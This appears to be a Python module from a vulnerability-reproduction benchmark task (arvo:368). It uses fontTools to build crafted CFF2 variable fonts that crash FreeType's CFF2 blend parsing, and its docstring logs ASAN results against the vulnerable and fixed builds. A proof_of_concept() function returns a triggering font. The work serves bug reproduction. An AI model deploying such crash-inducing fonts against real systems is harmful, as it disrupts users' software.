"""S8e（arvo:368 / freetype2）CFF2 可变字体构造器：用 fontTools 生成**合法**字体。

为什么需要它：cff_blend_* 只在 CFF2 解析路径上存在，而本机 355 个字体里 **没有一个 CFF2**；
s8c 的手工合成（裸 CFF2 表 + 拼接）都被 freetype 判成"不是可用字体"，0 命中。
本构造器改用 fontTools 的 FontBuilder（fvar + CFF2 Regions + blend charstring）生成字体，
再用 TTFont 重新加载自检，保证：OTTO 容器、CFF2 表、fvar 轴、VarStore 齐全。

**跨解释器**：仓库默认 python3（/usr/local/bin/python3）没有 fontTools，
而 fontTools 4.65 装在 /usr/bin/python3。所以生成逻辑以子进程方式跑在
FONTTOOLS_PYTHON 上（内嵌生成脚本），本模块自身不 import fontTools。

实测（n132/arvo:368-vul / -fix）：
- vul：3/3 SEGV，ASAN 报 cff_blend_build_vector cffload.c:1365（blend->font 为空）；
- fix：0/3，干净退出。
注意：落在 cff_blend_build_vector 而不是任务描述的 cff_blend_doBlend UAF ——
说明字体已经进了 CFF2 blend 路径，但 VarStore/fvar 的一致性还没对上（见 EVIDENCE）。
"""
from __future__ import annotations

import json
import os
import subprocess
import tempfile

FONTTOOLS_PYTHON = "/usr/bin/python3"

DEFAULTS = {"axes": 2, "regions": 1, "blends": 1, "values": 7, "dict_blends": 0}

FIELDS = {
    "axes": "int(1..4), fvar 轴数量（默认 2：wght/wdth）",
    "regions": "int(1..8), CFF2 VarStore 区域数（决定每段 blend 的 delta 个数）",
    "blends": "int(1..4096), 连续 blend 段数量（越大越容易压 blend_stack）",
    "values": "int(1..64), 每段 blend 的默认值个数",
    "dict_blends": "int(0..4096), Private DICT 里 BlueValues 的 blend 个数（0=不带 DICT blend）",
}

# 内嵌生成脚本：在 FONTTOOLS_PYTHON 上执行，输出路径与参数走 argv
_GENERATOR = r'''import json, sys
from fontTools.fontBuilder import FontBuilder
from fontTools.misc.psCharStrings import T2CharString
from fontTools.ttLib import TTFont

params, out = json.loads(sys.argv[1]), sys.argv[2]
axes_n = int(params["axes"]); regions_n = int(params["regions"])
blends = int(params["blends"]); values = int(params["values"])
dict_blends = int(params.get("dict_blends", 0))

axis_defs = [("wght", 100, 400, 900, "Weight"), ("wdth", 50, 100, 200, "Width"),
             ("opsz", 8, 12, 144, "Optical Size"), ("ital", 0, 0, 1, "Italic")][:axes_n]
regions = []
for i in range(regions_n):
    reg = {}
    for ai, (tag, *_rest) in enumerate(axis_defs):
        reg[tag] = ((i >> ai) % 2, 1, 1) if (i >> ai) % 2 else (0, 1, 1)
    regions.append(reg)

fb = FontBuilder(1000, isTTF=False)
glyphs = [".notdef", "A"]
fb.setupGlyphOrder(glyphs)
fb.setupCharacterMap({65: "A"})
fb.setupNameTable({"familyName": "ProtoCFF2", "styleName": "Regular",
                   "uniqueFontIdentifier": "ProtoCFF2-Regular",
                   "fullName": "ProtoCFF2 Regular", "psName": "ProtoCFF2-Regular",
                   "version": "Version 1.0"})
fb.setupFvar(axis_defs, [])
prog = []
for _ in range(blends):
    prog += [100] * values + [10] * (values * regions_n) + ["blend"]
prog.append("endchar")
fb.setupCFF2({".notdef": T2CharString(program=["endchar"]),
              "A": T2CharString(program=prog)}, regions=regions)

# Private DICT 必须存在：freetype 的 cff_load_private_dict 在"没有 Private DICT"时
# 直接 goto Exit2，blend.font 不会被设置 -> 后面 cff_blend_build_vector 解引用 NULL。
td = fb.font["CFF2"].cff.topDictIndex[0]
for fd in td.FDArray:
    if dict_blends > 0:
        # DICT 里的 blend：[[V, d0..dn], ...] 由 cffLib 编成 numBlends + blendOp，
        # 这才是官方栈 cff_load_private_dict -> cff_parser_run -> cff_blend_doBlend 的入口
        fd.Private.rawDict["BlueValues"] = [[100 + i, 1, 2] for i in range(dict_blends)]
    else:
        fd.Private.rawDict["BlueValues"] = [-10, 0]

fb.setupHorizontalMetrics({g: (500, 0) for g in glyphs})
fb.setupHorizontalHeader(ascent=800, descent=-200)
fb.setupOS2(); fb.setupPost()
fb.setupHead(created=0, modified=0)
fb.save(out)
TTFont(out)
print("ok")
'''


class Cff2Result:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "freetype-cff2"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def fonttools_available(python: str = FONTTOOLS_PYTHON) -> bool:
    try:
        r = subprocess.run([python, "-c", "import fontTools; print(fontTools.version)"],
                           capture_output=True, text=True, timeout=60)
    except Exception:
        return False
    return r.returncode == 0


def build(fields: dict, *, python: str = FONTTOOLS_PYTHON) -> Cff2Result:
    """按字段生成 CFF2 可变字体；返回 OTTO 容器字节。"""
    fields = dict(fields or {})
    used, dropped = {}, []
    params = dict(DEFAULTS)
    for key in ("axes", "regions", "blends", "values", "dict_blends"):
        if key in fields:
            try:
                params[key] = int(fields[key])
            except (TypeError, ValueError):
                return Cff2Result(False, reason="%s 必须是整数" % key)
    if not 1 <= params["axes"] <= 4:
        return Cff2Result(False, reason="axes 越界（1..4）")
    if not 1 <= params["regions"] <= 8:
        return Cff2Result(False, reason="regions 越界（1..8）")
    if not 1 <= params["blends"] <= 4096:
        return Cff2Result(False, reason="blends 越界（1..4096）")
    if not 1 <= params["values"] <= 64:
        return Cff2Result(False, reason="values 越界（1..64）")
    if not 0 <= params["dict_blends"] <= 4096:
        return Cff2Result(False, reason="dict_blends 越界（0..4096）")
    used.update(params)
    for k in fields:
        if k not in FIELDS:
            dropped.append({"field": k, "reason": "freetype_cff2 构造器不识别该字段"})

    if not fonttools_available(python):
        return Cff2Result(False, reason="fontTools 不可用：%s" % python)

    fd, path = tempfile.mkstemp(suffix=".otf")
    os.close(fd)
    try:
        r = subprocess.run([python, "-c", _GENERATOR, json.dumps(params), path],
                           capture_output=True, text=True, timeout=300)
        if r.returncode != 0:
            return Cff2Result(False, reason="生成失败: " + (r.stderr or r.stdout)[-400:])
        with open(path, "rb") as fh:
            data = fh.read()
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass
    if not data.startswith(b"OTTO"):
        return Cff2Result(False, reason="生成结果不是 OTTO 容器")
    return Cff2Result(True, data, used, dropped)


def inspect(data: bytes, *, python: str = FONTTOOLS_PYTHON) -> dict:
    """用 fontTools 重新加载并回报表清单/轴信息（校验用）。"""
    fd, path = tempfile.mkstemp(suffix=".otf")
    os.close(fd)
    try:
        with open(path, "wb") as fh:
            fh.write(data)
        code = ("import json,sys;"
                "from fontTools.ttLib import TTFont;"
                "f=TTFont(sys.argv[1]);"
                "print(json.dumps({'tables':sorted(f.keys()),"
                "'axes':[[a.axisTag,a.minValue,a.defaultValue,a.maxValue] for a in f['fvar'].axes] if 'fvar' in f else []}))")
        r = subprocess.run([python, "-c", code, path], capture_output=True, text=True, timeout=120)
        if r.returncode != 0:
            return {"ok": False, "error": (r.stderr or r.stdout)[-300:]}
        out = json.loads(r.stdout.strip().splitlines()[-1])
        out["ok"] = True
        return out
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass


def proof_of_concept(**overrides) -> bytes:
    """默认参数下的触发字体（1 段 blend、1 个区域、2 轴）。"""
    res = build(overrides)
    if not res.ok:
        raise RuntimeError("freetype_cff2 builder failed: " + res.reason)
    return res.data
